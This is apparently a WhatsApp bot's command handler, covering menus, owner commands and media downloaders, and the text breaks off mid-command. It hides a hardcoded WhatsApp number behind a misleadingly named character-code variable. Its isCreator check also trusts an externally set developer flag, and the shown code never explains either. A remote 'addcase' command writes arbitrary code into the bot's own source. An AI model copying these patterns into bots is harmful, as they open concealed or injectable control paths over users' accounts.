const chalk = require("chalk");
const fs = require("fs");
const util = require("util");
const os = require('os');
const path = require('path');
const yts = require("yt-search");
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, makeWAMessage, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptionsuseSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require("@denzy-official/baileys");

//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp } = require('./lib/myfunction');
//==================================//
const { LoadDataBase } = require('./lib/message');
//==================================//

//==================================//

function isSameUser(jid1, jid2) {
    if (!jid1 || !jid2) return false;
    const isLid = (jid) => jid.endsWith('@lid');
    const normalizedJid1 = jid1.replace('@lid', '@s.whatsapp.net');
    const normalizedJid2 = jid2.replace('@lid', '@s.whatsapp.net');
    return areJidsSameUser(normalizedJid1, normalizedJid2);
}

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefix = "/"
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isCreator = [botNumber, ...global.owner.map(a => a.replace(/[^0-9]/g, '') + '@s.whatsapp.net')].includes(m.sender)
  ? true
  : m.isDeveloper
  ? true
  : false;
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
  
//==================================//
let example = (teks) => {
return `\n*Contoh Penggunaan :*\n*${prefix}${command}* ${teks}`
}  
//==================================//

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\nCommand :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\nFrom :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//==================================//
    
//==================================//

switch (command) {
case "tes":
case "menu": {
const teks = `
╭─〔 \`BOT INFO\` 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name* : ${global.botname}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Mode* : ${sock.public ? "Public" : "Self"}
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
  {
    buttonId: `${prefix}owner`,
    buttonText: { displayText: 'Contact Owner' },
    type: 1
  },
  {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'Pencet Kids',
        sections: [
          {
            title: 'Jangan di spam kontol',
            highlight_label: 'Recommended',
            rows: [
              { 
                title: 'Owner Menu', 
                description: 'Only XskyBew',
                id: `${prefix}menu-owner` 
              },
              { 
                title: 'Download Menu', 
                description: 'Downloader Sosmed',
                id: `${prefix}menu-download`
              },
              { 
                title: 'Search Menu', 
                description: 'Searching Audio/Video',
                id: `${prefix}menu-search`
              },
              { 
                title: 'Tools Menu', 
                description: 'Fitur Tambahan',
                id: `${prefix}menu-tools`
              }
            ]
          }
        ]
      })
    }
  }
],

  image: { url: 'https://files.catbox.moe/f94etm.jpg' },
  caption: teks,
  headerType: 6,
  contextInfo: {
    forwardingScore: 99999,
    isForwarded: true,
    externalAdReply: {
      title: "XskyBew — Bot Developer Advanced Engine",
      body: "Project Gabut",
      mediaUrl: "https://files.catbox.moe/pinp5c.jpg",
      mediaType: 1,
      thumbnailUrl: "https://files.catbox.moe/pinp5c.jpg",
      renderLargerThumbnail: true,
      showAdAttribution: true,
      adReplyButtonText: "Open Preview",
      sourceUrl: "t.me/XskyBew",
      previewType: 2
    }
  }
}, { quoted: m });
}
break;
//==================================/  
case "developerbot":
case "owner": {
  await sock.sendContact(m.chat, [global.owner], "XskyBew", m)
  break
}
//==================================/       
case "menu-owner": {
const teks = `
╭─〔 \`OWNER MENU\` 〕
│ .getcase
│ .addcase
│ .delcase
│ .backup
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
  {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'PENCET DONGO',
        sections: [
          {
            title: 'Jangan di spam kontol',
            highlight_label: 'LU JEMBUT ANJING',
            rows: [
              { 
                title: 'Owner Menu', 
                description: 'Only XskyBew',
                id: `${prefix}menu-owner`
              },
              { 
                title: 'Download Menu', 
                description: 'Downloader Sosmed',
                id: `${prefix}menu-download`
              },
              { 
                title: 'Search Menu', 
                description: 'Searching Audio/Video',
                id: `${prefix}menu-search`
              },
              { 
                title: 'Tools Menu', 
                description: 'Fitur Tambahan',
                id: `${prefix}menu-tools` 
              }
            ]
          }
        ]
      })
    }
  }
],
  text : teks,
}, { quoted: m });
}
break;
//==================================/   
case "menu-download": {
const teks = `
╭─〔 \`DOWNLOAD MENU\` 〕
│ .instagram
│ .tiktok
│ .github
│ .ytmp3
│ .ytmp4
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
  {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'PENCET DONGO',
        sections: [
          {
            title: 'Jangan di spam kontol',
            highlight_label: 'LU JEMBUT ANJING',
            rows: [
              { 
                title: 'Owner Menu', 
                description: 'Only XskyBew',
                id: `${prefix}menu-owner` 
              },
              { 
                title: 'Download Menu', 
                description: 'Downloader Sosmed',
                id: `${prefix}menu-download`
              },
              { 
                title: 'Search Menu', 
                description: 'Searching Audio/Video',
                id: `${prefix}menu-search`
              },
              { 
                title: 'Tools Menu', 
                description: 'Fitur Tambahan',
                id: `${prefix}menu-tools`
              }
            ]
          }
        ]
      })
    }
  }
],
  text : teks,
}, { quoted: m });
}
break;
//==================================/  
case "menu-search": {
const teks = `
╭─〔 \`SEARCH MENU\` 〕
│ .play
│ .pinterest
│ .ytsearch
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
  {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'PENCET DONGO',
        sections: [
          {
            title: 'Jangan di spam kontol',
            highlight_label: 'LU JEMBUT ANJING',
            rows: [
              { 
                title: 'Owner Menu', 
                description: 'Only XskyBew',
                id: `${prefix}menu-owner` 
              },
              { 
                title: 'Download Menu', 
                description: 'Downloader Sosmed',
                id: `${prefix}menu-download`
              },
              { 
                title: 'Search Menu', 
                description: 'Searching Audio/Video',
                id: `${prefix}menu-search`
              },
              { 
                title: 'Tools Menu', 
                description: 'Fitur Tambahan',
                id: `${prefix}menu-tools`
              }
            ]
          }
        ]
      })
    }
  }
],
  text : teks,
}, { quoted: m });
}
break; 
//==================================/   
case "menu-tools": {
const teks = `
╭─〔 \`TOOLS MENU\` 〕
│ .iqc
│ .hidetag
╰─
`;
await sock.sendMessage(m.chat, {
  footer: `© 2024 XskyBew`,
  buttons: [
  {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'PENCET DONGO',
        sections: [
          {
            title: 'Jangan di spam kontol',
            highlight_label: 'LU JEMBUT ANJING',
            rows: [
              { 
                title: 'Owner Menu', 
                description: 'Only XskyBew',
                id: `${prefix}menu-owner`
              },
              { 
                title: 'Download Menu', 
                description: 'Downloader Sosmed',
                id: `${prefix}menu-download` 
              },
              { 
                title: 'Search Menu', 
                description: 'Searching Audio/Video',
                id: `${prefix}menu-search`
              },
              { 
                title: 'Tools Menu', 
                description: 'Fitur Tambahan',
                id: `${prefix}menu-tools` 
              }
            ]
          }
        ]
      })
    }
  }
],
  text : teks,
}, { quoted: m });
}
break;
//==================================/   
//==================================/       

case "getcase": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example("ytmp3"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break          
        
//==================================//

 case 'addcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(example(`casenya`));
    const namaFile = path.join(__dirname, 'case.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return m.reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return m.eply(result.message);
        }
    });
}
break       

//==================================//

case 'delcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) 
        return m.reply(example(`nama_case`));

    const fs = require('fs').promises;

    async function removeCase(filePath, caseNameToRemove) {
        try {
            let data = await fs.readFile(filePath, 'utf8');
            
            const regex = new RegExp(`case\\s+['"\`]${caseNameToRemove}['"\`]:[\\s\\S]*?break;?`, 'g');
            
            const modifiedData = data.replace(regex, '');

            if (data === modifiedData) {

                return m.reply(`❌ Case "${caseNameToRemove}" tidak ditemukan.\n\nPastikan penulisan sudah benar dan tidak ada typo.`);
            }

            await fs.writeFile(filePath, modifiedData, 'utf8');
            m.reply(`✅ Sukses menghapus case: *${caseNameToRemove}*`);
        } catch (err) {
            Reply(`Terjadi kesalahan saat memproses file: ${err.message}`);
        }
    }
    removeCase('./case.js', text.trim());
}
break
        
//==================================//
case "play": {
  try {
    if (!text) return m.reply(example("dj komang"));
    
    const loadMsg = await sock.sendMessage(m.chat, { text: "🔍 Mencari lagu..." }, { quoted: m });
    const search = await yts(text);
    const video = search.videos[0];
    
    if (!video) {
      await sock.sendMessage(m.chat, { text: "❌ Lagu tidak ditemukan!", edit: loadMsg.key });
      return;
    }
    
    const yt = {
      url: Object.freeze({
        audio128: 'https://api.apiapi.lat',
        video: 'https://api5.apiapi.lat',
        else: 'https://api3.apiapi.lat',
        referrer: 'https://ogmp3.pro/'
      }),
      encUrl: s => s.split('').map(c => c.charCodeAt()).reverse().join(';'),
      xor: s => s.split('').map(v => String.fromCharCode(v.charCodeAt() ^ 1)).join(''),
      genRandomHex: () => Array.from({ length: 32 }, _ => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join(""),
      init: async function (rpObj) {
        const { apiOrigin, payload } = rpObj;
        const api = apiOrigin + "/" + this.genRandomHex() + "/init/" + this.encUrl(this.xor(payload.data)) + "/" + this.genRandomHex() + "/";
        const r = await fetch(api, { method: "post", body: JSON.stringify(payload) });
        if (!r.ok) throw Error(await r.text());
        return r.json();
      },
      genFileUrl: function (i, pk, rpObj) {
        const { apiOrigin } = rpObj;
        const pkValue = pk ? pk + "/" : "";
        const downloadUrl = apiOrigin + "/" + this.genRandomHex() + "/download/" + i + "/" + this.genRandomHex() + "/" + pkValue;
        return { downloadUrl };
      },
      statusCheck: async function (i, pk, rpObj) {
        const { apiOrigin } = rpObj;
        let json;
        let count = 0;
        do {
          await new Promise(r => setTimeout(r, 5000));
          count++;
          const pkVal = pk ? pk + "/" : "";
          const api = apiOrigin + "/" + this.genRandomHex() + "/status/" + i + "/" + this.genRandomHex() + "/" + pkVal;
          const r = await fetch(api, {
            method: "post",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ data: i })
          });
          if (!r.ok) throw Error(await r.text());
          json = await r.json();
          if (count >= 100) throw Error("Polling mencapai batas maksimal");
        } while (json.s === "P");
        if (json.s === "E") throw Error(JSON.stringify(json));
        return this.genFileUrl(i, pk, rpObj);
      },
      resolvePayload: function (ytUrl, userFormat) {
        let apiOrigin = this.url.audio128;
        let data = this.xor(ytUrl);
        let referer = this.url.referrer;
        let format = "0";
        let mp3Quality = "128";
        let mp4Quality = "720";
        if (/^\d+p$/.test(userFormat)) {
          apiOrigin = this.url.video;
          format = "1";
          mp4Quality = userFormat.replace("p", "");
        } else if (userFormat !== "128k") {
          apiOrigin = this.url.else;
          mp3Quality = userFormat.replace("k", "");
        }
        return {
          apiOrigin,
          payload: {
            data,
            format,
            referer,
            mp3Quality,
            mp4Quality,
            userTimeZone: "-480"
          }
        };
      },
      download: async function (url, fmt = "128k") {
        const rpObj = this.resolvePayload(url, fmt);
        const initObj = await this.init(rpObj);
        const { i, pk, s } = initObj;
        if (s === "C") return this.genFileUrl(i, pk, rpObj);
        return this.statusCheck(i, pk, rpObj);
      }
    };
    
    await sock.sendMessage(m.chat, { text: "⏳ Mendownload audio...", edit: loadMsg.key });
    
    const result = await yt.download(video.url, "128k");
    const response = await fetch(result.downloadUrl);
    const buffer = await response.arrayBuffer();
    
    await sock.sendMessage(m.chat, { text: "✅ Mengirim audio...", edit: loadMsg.key });
    
    await sock.sendMessage(m.chat, {
      audio: Buffer.from(buffer),
      mimetype: 'audio/mpeg',
      fileName: `${video.title}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: video.title,
          body: video.author.name,
          thumbnailUrl: video.thumbnail,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });
    
    await sock.sendMessage(m.chat, { delete: loadMsg.key });
    
  } catch (err) {
    console.error(err);
    m.reply(`❌ Gagal memutar lagu:\n${err.message || String(err)}`);
  }
}
break;
//==================================//

async function createTiktokSlide(images, caption) {
  const cards = [];
  
  for (let i = 0; i < images.length; i++) {
    let imgsc = await prepareWAMessageMedia({ 
      image: { url: images[i] }
    }, { upload: sock.waUploadToServer });
    
    cards.push({
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: i === 0 ? caption : `Slide ${i + 1}`,
        hasMediaAttachment: true,
        ...imgsc
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: []
      })
    });
  }
  
  return cards;
}

case "tiktok":
case "tt": {
  try {
    if (!text) return m.reply(example("linknya"));
    
    const loadMsg = await sock.sendMessage(m.chat, { text: "wet..." }, { quoted: m });
    
    let url = text;
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    
    await sock.sendMessage(m.chat, { text: "Memproses TikTok...", edit: loadMsg.key });
    
    const api = `https://piereeapi.vercel.app/download/tiktok?url=${encodeURIComponent(url)}`;
    const response = await fetch(api);
    const data = await response.json();
    
    if (!data.status) throw new Error("Gagal mengambil data TikTok");
    
    const { result } = data;
    const caption = `${result.title}

👤 Author: ${result.author.nickname} (@${result.author.username})
⏱️ Durasi: ${result.duration}s
📅 Upload: ${result.create_time}
🌍 Region: ${result.region}

📊 Statistik:
👁️ Views: ${result.statistics.views.toLocaleString()}
❤️ Likes: ${result.statistics.likes.toLocaleString()}
💬 Comments: ${result.statistics.comments.toLocaleString()}
🔄 Shares: ${result.statistics.shares.toLocaleString()}
⬇️ Downloads: ${result.statistics.downloads.toLocaleString()}

🎵 Music: ${result.music.title}`;
    
    if (result.media.images && result.media.images.length > 0) {
      await sock.sendMessage(m.chat, { text: "Mengirim gambar...", edit: loadMsg.key });
      
      const cards = await createTiktokSlide(result.media.images, caption);
      
      const msgii = await generateWAMessageFromContent(m.chat, {
        ephemeralMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: caption
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              })
            })
          }
        }
      }, { userJid: m.sender, quoted: m });
      
      await sock.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
      
    } else {
      await sock.sendMessage(m.chat, { text: "Mengirim video...", edit: loadMsg.key });
      
      const videoResponse = await fetch(result.download_links.hd_quality);
      const videoBuffer = await videoResponse.arrayBuffer();
      
      await sock.sendMessage(m.chat, {
        video: Buffer.from(videoBuffer),
        caption: caption,
        mimetype: 'video/mp4'
      }, { quoted: m });
      
      await sock.sendMessage(m.chat, { text: "Mengirim audio...", edit: loadMsg.key });
      
      const audioResponse = await fetch(result.download_links.no_watermark);
      const audioBuffer = await audioResponse.arrayBuffer();
      
      await sock.sendMessage(m.chat, {
        audio: Buffer.from(audioBuffer),
        mimetype: 'audio/mpeg',
        fileName: 'audio.mp3'
      }, { quoted: m });
    }
    
    await sock.sendMessage(m.chat, { delete: loadMsg.key });
    
  } catch (err) {
    console.error(err);
    m.reply(`Gagal mendownload TikTok:\n${err.message || String(err)}`);
  }
}
break;

case "ig":
case "igdl": {
  try {
    if (!text) return m.reply(example("linknya"));

    const loadMsg = await sock.sendMessage(m.chat, { text: "wet..." }, { quoted: m });

    let url = text.startsWith("http") ? text : "https://" + text;

    await sock.sendMessage(m.chat, { text: "Memproses Instagram...", edit: loadMsg.key });

    const api = `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(url)}`;
    const res = await fetch(api);
    const data = await res.json();

    if (!data.status) throw new Error("Gagal mengambil data Instagram");

    const result = data.data;

    const caption = `${result.caption || "Tanpa caption"}

👤 Author: ${result.author || "-"}
📅 Upload: ${result.publish || "-"}
🔗 Type: ${result.type || "-"}`;

    const medias = result.medias;

    if (medias.length > 1 && medias.every(v => v.type === "image")) {
      await sock.sendMessage(m.chat, { text: "Mengirim slide...", edit: loadMsg.key });

      const cards = [];
      for (let i = 0; i < medias.length; i++) {
        let imgsc = await prepareWAMessageMedia(
          { image: { url: medias[i].url } },
          { upload: sock.waUploadToServer }
        );

        cards.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: i === 0 ? caption : `Slide ${i + 1}`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
          })
        });
      }

      const msgii = await generateWAMessageFromContent(m.chat, {
        ephemeralMessage: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({ text: caption }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards
              })
            })
          }
        }
      }, { userJid: m.sender, quoted: m });

      await sock.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    }

    else if (medias[0].type === "image") {
      await sock.sendMessage(m.chat, { text: "Mengirim gambar...", edit: loadMsg.key });

      await sock.sendMessage(m.chat, {
        image: { url: medias[0].url },
        caption
      }, { quoted: m });
    }

    else if (medias[0].type === "video") {
      await sock.sendMessage(m.chat, { text: "Mengirim video...", edit: loadMsg.key });

      const vidRes = await fetch(medias[0].url);
      const vidBuf = await vidRes.arrayBuffer();

      await sock.sendMessage(m.chat, {
        video: Buffer.from(vidBuf),
        caption,
        mimetype: "video/mp4"
      }, { quoted: m });
    }

    await sock.sendMessage(m.chat, { delete: loadMsg.key });

  } catch (e) {
    console.error(e);
    m.reply(`Gagal mendownload Instagram:\n${e.message || e}`);
  }
}
break;

//==================================//

case "backupsc":
case "bck":
case "backup": {
if (!isCreator) return m.reply(mess.owner)
try {
const tmpDir = "./tmp";
if (fs.existsSync(tmpDir)) {
const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
for (let file of files) {
fs.unlinkSync(`${tmpDir}/${file}`);
}
}
await m.reply("Processing Backup Script . .");
const name = `XskyBew`; 
const exclude = ["node_modules", "Auth", "package-lock.json", "session", ".zip", "yarn.lock", ".npm", ".cache"];
const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

await sock.sendMessage(m.sender, {
document: fs.readFileSync(`./${name}.zip`),
fileName: `${name}.zip`,
mimetype: "application/zip"
}, { quoted: m });

fs.unlinkSync(`./${name}.zip`);

if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
} catch (err) {
console.error("Backup Error:", err);
m.reply("Terjadi kesalahan saat melakukan backup.");
}
}
break       
        
//==================================/
case 'pinterest':
case 'pin': {
  if (!text) return m.reply(example('judul fotonya'));

  let load = await sock.sendMessage(m.chat, { text: '🔍 Mencari...' })

  try {
    const axios = require('axios')
    const { data } = await axios.get(
      `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(text)}&type=image`
    )

    if (!data?.data?.length)
      return sock.sendMessage(m.chat, { text: 'Tidak ditemukan.', edit: load.key})

    await sock.sendMessage(m.chat, { text: '📸 Menyiapkan carousel...' , edit: load.key })

    const hasil = data.data.slice(0, 8)
    const cards = []

    for (let item of hasil) {
      const title = item.grid_title || item.seo_alt_text || item.description || 'Pinterest'
      const imgUrl = item.image_url
      const link = item.link || item.pin || 'https://pinterest.com'

      const media = await prepareWAMessageMedia(
        { image: { url: imgUrl } },
        { upload: sock.waUploadToServer }
      )

      cards.push({
        header: {
          title: title,
          hasMediaAttachment: true,
          ...media
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({
                display_text: "🌐 Lihat",
                url: link,
                merchant_url: "https://google.com"
              })
            }
          ]
        }
      })
    }

    const msg = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: `✨ Hasil Pinterest: *${text}*` },
              carouselMessage: { cards }
            }
          }
        }
      },
      { userJid: m.sender, quoted: m }
    )

    await sock.sendMessage(m.chat, { text: '✔️ Selesai!' , edit: load.key })
    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (err) {
    console.error(err)
    await sock.sendMessage(m.chat, { text: '❌ Error!' , edit: load.key} )
  }
}
break
//==================================//

case "yts":
case "ytsearch": {
  try {
    if (!text) return m.reply(example("upin ipin"));
    const load = await sock.sendMessage(m.chat, { text: "🔍 Mencari..." }, { quoted: m });

    const result = await yts(text);
    const videos = result.all.filter(v => v.type === "video").slice(0, 10);

    if (!videos.length)
      return sock.sendMessage(m.chat, { text: "Video tidak ditemukan.", edit: load.key });

    await sock.sendMessage(m.chat, { text: "📦 Mengirim...", edit: load.key });

    const cards = [];

    for (let v of videos) {
      const img = await prepareWAMessageMedia(
        { image: { url: v.thumbnail } },
        { upload: sock.waUploadToServer }
      );

      const desc = v.description ? v.description.slice(0, 200) + "..." : "-";

      cards.push({
        header: {
          title:
`${v.title}

📺 Channel: ${v.author?.name || "-"}
⌛ Durasi: ${v.timestamp}
👁 Views: ${v.views}
📅 Upload: ${v.ago}

📝 Deskripsi:
${desc}`,
          hasMediaAttachment: true,
          ...img
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "Salin Link",
                copy_code: v.url
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Download MP3",
                id: `${prefix}ytmp3 ${v.url}`
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Download MP4",
                id: `${prefix}ytmp4 ${v.url}`
              })
            }
          ]
        }
      });
    }

    const msg = await generateWAMessageFromContent(
      m.chat,
      {
        interactiveMessage: {
          body: { text: `Hasil pencarian untuk: *${text}*\nGeser untuk lihat hasil lainnya.` },
          carouselMessage: { cards }
        }
      },
      { userJid: m.sender, quoted: m }
    );

    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    await sock.sendMessage(m.chat, { delete: load.key });

  } catch (e) {
    console.error(e);
    m.reply("Error: " + e.message);
  }
}
break;

case "iqc": {
    try {
        let teks = args.join(",");
        if (!teks) return m.reply(example("teksnya"));

        let [time, battery, message] = teks.split(",");
        time = time || new Date().toLocaleTimeString();
        battery = battery || "100";
        message = message || "…";

        let placeholder = await sock.sendMessage(m.chat, { text: "wet.." }, { quoted: m });

        let url = `https://piereeapi.vercel.app/tools/iqc?time=${encodeURIComponent(time)}&battery=${encodeURIComponent(battery)}&message=${encodeURIComponent(message)}`;
        let res = await fetch(url);
        let buffer = Buffer.from(await res.arrayBuffer());

        await sock.sendMessage(m.chat, { image: buffer }, { quoted: placeholder });
        await sock.sendMessage(m.chat, { delete: placeholder.key });
    } catch (err) {
        console.error(err);
        m.reply("Cuih eror dek");
    }
}
break;

case "ytmp3": {
  try {
    if (!text) return m.reply(example("link youtube"));
    
    const loadMsg = await sock.sendMessage(m.chat, { text: "wet..." }, { quoted: m });
    
    let url = text;
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    
    await sock.sendMessage(m.chat, { text: "Mendownload audio...", edit: loadMsg.key });
    
    const api = `https://piereeapi.vercel.app/download/ytmp3?url=${encodeURIComponent(url)}`;
    const response = await fetch(api);
    const data = await response.json();
    
    if (!data.status) throw new Error("Gagal mendownload audio");
    
    const caption = `╭────────────
│ Title: ${data.result.title}
│ Type: MP3
╰────────────`;
    
    const audioResponse = await fetch(data.result.download);
    const audioBuffer = await audioResponse.arrayBuffer();
    
    await sock.sendMessage(m.chat, { text: "Mengirim audio...", edit: loadMsg.key });
    
    await sock.sendMessage(m.chat, {
      audio: Buffer.from(audioBuffer),
      mimetype: 'audio/mpeg',
      fileName: `${data.result.title}.mp3`,
      caption: caption
    }, { quoted: m });
    
    await sock.sendMessage(m.chat, { delete: loadMsg.key });
    
  } catch (err) {
    console.error(err);
    m.reply(`Gagal mendownload audio:\n${err.message || String(err)}`);
  }
}
break;

case "ytmp4": {
  try {
    if (!text) return m.reply(example("link youtube"));
    
    const loadMsg = await sock.sendMessage(m.chat, { text: "wet..." }, { quoted: m });
    
    let url = text;
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    
